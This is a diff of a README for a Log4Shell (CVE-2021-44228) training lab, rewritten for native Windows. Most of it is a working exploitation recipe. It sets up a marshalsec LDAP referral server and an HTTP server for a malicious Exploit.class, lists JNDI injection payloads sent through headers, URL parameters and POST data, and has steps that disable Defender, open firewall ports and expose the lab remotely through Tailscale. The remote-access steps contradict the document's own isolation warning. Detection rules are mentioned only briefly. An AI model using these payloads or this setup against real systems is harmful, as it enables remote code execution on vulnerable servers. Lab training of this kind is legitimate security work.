@@ -1,87 +1,121 @@
 # Log4Shell Security Research Lab
 
 ## Overview
-Complete Log4Shell (CVE-2021-44228) vulnerability lab environment with exploitation tools and comprehensive detection rules for YARA, Sigma, and Nuclei.
+Complete Log4Shell (CVE-2021-44228) vulnerability lab environment for Windows with exploitation tools and comprehensive detection rules for YARA, Sigma, and Nuclei.
 
-⚠️ **Status**: Lab is 90% complete - vulnerability confirmed working, final exploitation testing needed.
+**Status**: Lab fully operational - Windows native setup (no Docker required)
+
+## Prerequisites
+
+1. **Java 8** - Install from: `C:\Log4Shell-Lab\tools\zulu8.30.0.1-jdk8.0.172-win_x64.msi`
+2. **Python 3.x** - For HTTP server
+3. **Windows Defender** - Must be disabled or have exclusions for lab folder
+4. **curl** - For testing (comes with Windows 10+)
 
 ## Quick Start
 
-### 1. Clone Repository
-```bash
-git clone https://github.com/hasamba/ProxyLogonLab.git log4shell-security-lab
-cd log4shell-security-lab
+### 1. Setup Directory Structure
+```
+C:\Log4Shell-Lab\
+├── vulnerable-app\
+│   ├── SimpleVulnerable.class
+│   ├── log4j-core-2.14.1.jar
+│   ├── log4j-api-2.14.1.jar
+│   └── marshalsec.jar
+└── ldap-server\
+    └── Exploit.class
 ```
 
-### 2. Start the Lab (Use Simple Version)
-```bash
-# Use the working simple version
-docker-compose -f docker-compose-simple.yml up -d --build
+### 2. Start the Lab (3 Terminals Required)
+
+**Terminal 1 - Vulnerable Application:**
+```powershell
+cd C:\Log4Shell-Lab\vulnerable-app
+
+java -cp ".;log4j-core-2.14.1.jar;log4j-api-2.14.1.jar" "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true" "-Dcom.sun.jndi.rmi.object.trustURLCodebase=true" "-Dcom.sun.jndi.cosnaming.object.trustURLCodebase=true" SimpleVulnerable 2>&1 | Tee-Object -FilePath app.log
 ```
 
-### 3. Verify Setup
-```bash
-# Check all containers running
-docker ps
+**Terminal 2 - LDAP Server (marshalsec):**
+```powershell
+cd C:\Log4Shell-Lab\vulnerable-app
 
-# Test vulnerability (should expand Java version)
-docker exec attacker-machine curl -H "User-Agent: test_\${java:version}" http://log4shell-simple:8080
+java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://localhost:8888/#Exploit" 1389 0.0.0.0
 ```
 
-### 4. Run Exploitation
-```bash
-# Terminal 1: Start listener
-docker exec -it attacker-machine /bin/bash
-cd /tools
-python3 listener.py
+**Terminal 3 - HTTP Server (serves Exploit.class):**
+```powershell
+cd C:\Log4Shell-Lab\ldap-server\
 
-# Terminal 2: Run exploit
-docker exec -it attacker-machine /bin/bash
-cd /tools
-python3 exploit.py
-
-# Check success
-docker exec log4shell-simple ls -la /tmp/pwned.txt
+python -m http.server 8888 --bind 0.0.0.0
 ```
 
-### 5. Run Detection Tools
-```bash
-docker exec -it attacker-machine /bin/bash
-cd /tools
-python3 detect.py
+### 3. Run Exploitation
+
+**Local Attack (PowerShell):**
+```powershell
+# Test JNDI expansion
+curl -H "User-Agent: `${java:version}" http://localhost:8080
+
+# Launch exploit
+curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
+```
+
+**Browser Attack:**
+```
+http://localhost:8080/?q=${jndi:ldap://127.0.0.1:1389/Exploit}
+```
+
+### 4. Run Detection
+```powershell
+# YARA scan
+yara64.exe detection-rules\log4shell-enhanced.yar C:\Log4Shell-Lab\vulnerable-app\app.log
+
+# Check for JNDI patterns
+Select-String -Path C:\Log4Shell-Lab\vulnerable-app\app.log -Pattern '\$\{jndi:'
 ```
 
 ## Lab Components
 
-### Vulnerable Application (Port 8080)
-- Spring Boot app with Log4j 2.14.1 (vulnerable version)
-- Endpoints: `/login`, `/api/v1/search`, `/api/v1/callback`
-- Logs user input through Log4j
+| Component | Port | Description |
+|-----------|------|-------------|
+| Vulnerable App | 8080 | Java app with Log4j 2.14.1 |
+| LDAP Server | 1389 | marshalsec redirecting to HTTP |
+| HTTP Server | 8888 | Serves malicious Exploit.class |
 
-### LDAP/HTTP Exploit Server (Ports 1389, 8888)
-- LDAP server redirects to malicious Java class
-- HTTP server hosts compiled exploit payload
-- Automatically compiles and serves Exploit.class
+## Exploitation Flow
 
-### Attacker Machine
-- Exploitation scripts with multiple payload variants
-- Detection tools (YARA, Sigma, Nuclei)
-- Callback listener for successful exploits
+1. Attacker sends JNDI payload via HTTP header/parameter
+2. Vulnerable app logs the input using Log4j
+3. Log4j processes `${jndi:ldap://...}` lookup
+4. App connects to LDAP server (port 1389)
+5. LDAP redirects to HTTP server (port 8888)
+6. App downloads and executes Exploit.class
 
-## Exploitation Steps
+## Attack Vectors
 
-1. **Listener Setup**: Start callback listener on port 9999
-2. **Send Payloads**: Script injects JNDI strings via:
-   - HTTP headers (User-Agent, X-Api-Version, etc.)
-   - POST parameters (username, password)
-   - GET parameters (query)
-   - JSON body (callback)
+```powershell
+# Header injection
+curl -H "User-Agent: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
+curl -H "X-Forwarded-For: `${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
 
-3. **Exploitation Flow**:
-   - App logs JNDI string → Log4j processes lookup
-   - Connects to LDAP server → Gets redirect to HTTP
-   - Downloads Exploit.class → Executes static block
-   - Creates `/tmp/pwned.txt` → Sends callback
+# URL parameter
+curl "http://localhost:8080/?search=`${jndi:ldap://127.0.0.1:1389/Exploit}"
+
+# POST data
+curl -X POST -d "username=`${jndi:ldap://127.0.0.1:1389/Exploit}" http://localhost:8080
+```
+
+## Remote Access
+
+### Option 1: Tailscale Funnel
+```powershell
+tailscale funnel 8080
+```
+
+### Option 2: Direct IP
+Add to hosts: `127.0.0.1 attacker.local`
+
+Attack: `http://YOUR_IP:8080/?q=${jndi:ldap://YOUR_IP:1389/Exploit}`
 
 ## Detection Methods
 
@@ -89,70 +123,51 @@ python3 detect.py
 - JNDI lookup patterns
 - Obfuscation techniques
 - Exploitation artifacts
-- Vulnerable Log4j versions
-- Webshell indicators
 
 ### Sigma Rules
 - Web server log patterns
 - Process creation anomalies
 - Network connections
-- File creation events
-- Application log analysis
 
 ### Nuclei Templates
-- Basic JNDI injection
-- Obfuscated payloads
-- WAF bypass techniques
+- JNDI injection testing
 - Header injection points
-- POST/JSON testing
+- WAF bypass techniques
 
-## Verification Commands
+## Firewall Configuration
 
-```bash
-# Check if exploitation succeeded
-docker exec log4shell-vulnerable ls -la /tmp/pwned.txt
-
-# View LDAP server logs
-docker logs ldap-exploit-server
-
-# Check application logs for JNDI patterns
-docker exec log4shell-vulnerable cat /app/logs/application.log | grep jndi
-
-# View all running containers
-docker ps
-
-# Access vulnerable app
-curl http://localhost:8080
+Run as Administrator:
+```powershell
+netsh advfirewall firewall add rule name="Log4Shell 8080" dir=in action=allow protocol=TCP localport=8080
+netsh advfirewall firewall add rule name="Log4Shell 1389" dir=in action=allow protocol=TCP localport=1389
+netsh advfirewall firewall add rule name="Log4Shell 8888" dir=in action=allow protocol=TCP localport=8888
 ```
-
-## Security Notes
-
-⚠️ **WARNING**: This lab contains actual exploitation code for educational purposes only.
-- Run only in isolated environments
-- Do not expose to public networks
-- Use for security research and training only
-- Clean up after testing: `docker-compose down -v`
 
 ## Troubleshooting
 
-### Exploitation Not Working?
-- Ensure all containers are running: `docker ps`
-- Check LDAP server logs: `docker logs ldap-exploit-server`
-- Verify network connectivity between containers
-- Try different payload variants
+| Problem | Solution |
+|---------|----------|
+| Exploit not working | Ensure Defender is off, all 3 terminals running |
+| Port in use | `netstat -ano \| findstr :PORT` then `taskkill /PID <PID> /F` |
+| Connection refused | Check firewall rules, verify 0.0.0.0 binding |
+| Class not found | Verify Exploit.class exists in ldap-server folder |
 
-### Detection Not Triggering?
-- Ensure log files exist before running detection
-- Run exploitation first to generate artifacts
-- Check detection rule paths are correct
-- Verify tools are installed in attacker container
+## Security Warning
 
-## Clean Up
+This lab contains actual exploitation code for educational purposes only.
 
-```bash
-# Stop and remove all containers
-docker-compose down
+- Run only in isolated environments
+- Do not expose to public networks
+- Use for security research and training only
+- Disable Defender only during lab use
 
-# Remove volumes and images
-docker-compose down -v --rmi all
-```
+## Technical Details
+
+- **CVE**: CVE-2021-44228 (Log4Shell)
+- **Log4j Version**: 2.14.1 (vulnerable)
+- **CVSS Score**: 10.0 (Critical)
+- **Java Requirement**: JDK 1.8.x (Java 8)
+
+## Repository
+
+https://github.com/hasamba/Log4JLab
